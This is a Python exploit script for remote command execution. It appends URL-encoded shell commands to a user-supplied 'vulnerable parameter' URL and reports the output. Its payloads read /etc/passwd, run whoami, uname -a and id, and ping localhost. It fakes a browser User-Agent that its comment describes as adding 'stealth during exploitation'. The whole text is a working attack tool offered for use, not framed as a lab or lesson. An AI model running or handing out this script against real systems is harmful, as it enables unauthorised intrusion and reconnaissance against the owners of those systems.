import requests
import sys
import urllib.parse
from requests.exceptions import RequestException

# URL of the target vulnerable application
TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else input("Enter target URL (with vulnerable parameter): ")

# Define payloads
rce_payloads = [
    "cat /etc/passwd",  # Example for Unix-based systems
    "whoami",           # Fetch current user
    "uname -a",         # Get OS information
    "id",               # Get system user ID
    "ping -c 4 127.0.0.1",  # Perform a ping as a basic check
]

# Optional headers to add more stealth during exploitation
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def send_exploit(payload):
    # Encode payload to prevent URL encoding issues
    encoded_payload = urllib.parse.quote(payload)

    # Prepare exploit URL
    exploit_url = f"{TARGET_URL}{encoded_payload}"
    
    print(f"[*] Attempting payload: {payload}")
    try:
        response = requests.get(exploit_url, headers=headers, timeout=10)
        if response.status_code == 200:
            print("[+] Exploit succeeded! Response:")
            print(response.text[:500])  # Print first 500 characters of the response
        else:
            print(f"[-] Exploit failed with status code: {response.status_code}")
    except RequestException as e:
        print(f"[!] Error executing payload: {e}")

def run_rce_exploit():
    print("[*] Starting RCE exploitation...")
    for payload in rce_payloads:
        send_exploit(payload)

if __name__ == "__main__":
    print(f"Target URL: {TARGET_URL}")
    run_rce_exploit()
